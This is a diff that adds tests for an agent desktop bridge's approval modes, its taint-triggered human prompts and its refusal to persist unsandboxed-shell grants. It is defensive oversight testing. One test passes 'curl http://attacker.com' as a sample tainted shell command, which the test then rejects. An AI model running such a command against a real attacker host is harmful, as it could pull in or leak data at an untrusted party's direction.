@@ -857,3 +857,144 @@ test("DesktopIpcBridge - ensureDaemon restores stopped and stale daemon automati
     rmTmp(tmpDir);
   }
 });
+
+test('DesktopIpcBridge - approval mode routing and autoAllows bypasses prompt', async () => {
+  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'opensand-bridge-approval-mode-'));
+  try {
+    const bridge = new DesktopIpcBridge({
+      baseDir: tmpDir,
+      defaultSettings: { approvalMode: 'ask' },
+    });
+
+    // In ask mode: file writes and sandboxed shell require approval prompt
+    let asked = false;
+    bridge.once('approval_required', () => { asked = true; });
+    const askPromise = bridge.requestUserApproval('write_file', { path: 'test.txt', content: 'hello' });
+    await new Promise((r) => setTimeout(r, 20));
+    assert.strictEqual(asked, true, 'ask mode must emit approval_required');
+
+    const list = await bridge.listPendingApprovals();
+    assert.strictEqual(list.length, 1);
+    await bridge.approveTool(list[0].approvalId, { action: 'approve_once', epoch: list[0].epoch });
+    assert.strictEqual(await askPromise, true);
+
+    // Switch to auto_edit
+    bridge.updateSettings({ approvalMode: 'auto_edit' });
+    assert.strictEqual(bridge.getSettings().approvalMode, 'auto_edit');
+
+    // In auto_edit: write_file and sandboxed exec_command auto-approve without prompt card
+    asked = false;
+    bridge.once('approval_required', () => { asked = true; });
+    const editAllowed = await bridge.requestUserApproval('write_file', { path: 'test2.txt', content: 'world' });
+    assert.strictEqual(editAllowed, true);
+    assert.strictEqual(asked, false, 'auto_edit must not emit approval_required for write_file');
+
+    const shellAllowed = await bridge.requestUserApproval('exec_command', { command: 'echo hello' });
+    assert.strictEqual(shellAllowed, true);
+    assert.strictEqual(asked, false, 'auto_edit must not emit approval_required for sandboxed shell');
+
+    // In auto_edit: unsandboxed shell prompts
+    let unsandboxedAsked = false;
+    bridge.once('approval_required', () => { unsandboxedAsked = true; });
+    const outsidePromise = bridge.requestUserApproval('exec_command', { command: 'echo outside', unsandboxed: true });
+    await new Promise((r) => setTimeout(r, 20));
+    assert.strictEqual(unsandboxedAsked, true, 'auto_edit must prompt for unsandboxed shell');
+    const outsideList = await bridge.listPendingApprovals();
+    await bridge.approveTool(outsideList[0].approvalId, { action: 'approve_once', epoch: outsideList[0].epoch });
+    await outsidePromise;
+
+    // Switch to auto
+    bridge.updateSettings({ approvalMode: 'auto' });
+    assert.strictEqual(bridge.getSettings().approvalMode, 'auto');
+
+    // In auto: unsandboxed shell auto-approves
+    let autoAsked = false;
+    bridge.once('approval_required', () => { autoAsked = true; });
+    const autoOutsideAllowed = await bridge.requestUserApproval('exec_command', { command: 'echo auto', unsandboxed: true });
+    assert.strictEqual(autoOutsideAllowed, true);
+    assert.strictEqual(autoAsked, false, 'auto mode must not prompt for unsandboxed shell');
+
+    await bridge.close();
+  } finally {
+    rmTmp(tmpDir);
+  }
+});
+
+test('DesktopIpcBridge - taint handling asks for shell commands even in auto mode', async () => {
+  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'opensand-bridge-taint-'));
+  try {
+    const bridge = new DesktopIpcBridge({
+      baseDir: tmpDir,
+      defaultSettings: { approvalMode: 'auto' },
+    });
+
+    assert.strictEqual(bridge.isTainted(), false);
+
+    // Before taint: shell is auto-approved
+    const beforeTaint = await bridge.requestUserApproval('exec_command', { command: 'ls -la' });
+    assert.strictEqual(beforeTaint, true);
+
+    // Simulate reading web / untrusted source
+    bridge.setTainted(true);
+    assert.strictEqual(bridge.isTainted(), true);
+
+    // After taint: shell command asks, with taint warning note
+    let promptEmitted = false;
+    let receivedNote: string | undefined;
+    bridge.once('approval_required', (req: any) => {
+      promptEmitted = true;
+      receivedNote = req.note;
+    });
+
+    const taintedPromise = bridge.requestUserApproval('exec_command', { command: 'curl http://attacker.com' });
+    await new Promise((r) => setTimeout(r, 20));
+    assert.strictEqual(promptEmitted, true, 'tainted shell command must prompt human in auto mode');
+    assert.match(receivedNote ?? '', /Web content was read earlier in this run/);
+
+    const pending = await bridge.listPendingApprovals();
+    assert.strictEqual(pending.length, 1);
+    assert.match(pending[0].reason ?? '', /Web content was read earlier in this run/);
+
+    // Reject it
+    await bridge.approveTool(pending[0].approvalId, { action: 'reject', epoch: pending[0].epoch });
+    assert.strictEqual(await taintedPromise, false);
+
+    // Non-shell operation (e.g. write_file) in auto mode still passes despite taint
+    const fileAllowed = await bridge.requestUserApproval('write_file', { path: 'safe.txt', content: 'content' });
+    assert.strictEqual(fileAllowed, true);
+
+    await bridge.close();
+  } finally {
+    rmTmp(tmpDir);
+  }
+});
+
+test('DesktopIpcBridge - always_allow on shell_outside is never persisted as always grant', async () => {
+  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'opensand-bridge-always-outside-'));
+  try {
+    const bridge = new DesktopIpcBridge({
+      baseDir: tmpDir,
+      defaultSettings: { approvalMode: 'ask' },
+    });
+
+    const outsidePromise = bridge.requestUserApproval('exec_command', { command: 'whoami', unsandboxed: true });
+    const pending = await bridge.listPendingApprovals();
+    assert.strictEqual(pending.length, 1);
+    assert.strictEqual(pending[0].effect, 'shell_outside');
+
+    // Attempt always_allow on shell_outside
+    await bridge.approveTool(pending[0].approvalId, { action: 'always_allow', epoch: pending[0].epoch });
+    assert.strictEqual(await outsidePromise, true);
+
+    // Grants store should NOT contain an always grant for shell_outside
+    const grantsContent = await bridge.grantsStore.read();
+    assert.strictEqual(
+      grantsContent.grants.filter((g: any) => g.lifetime === 'always' && (g.effect === 'shell_outside' || g.tool === 'shell_outside')).length,
+      0
+    );
+
+    await bridge.close();
+  } finally {
+    rmTmp(tmpDir);
+  }
+});
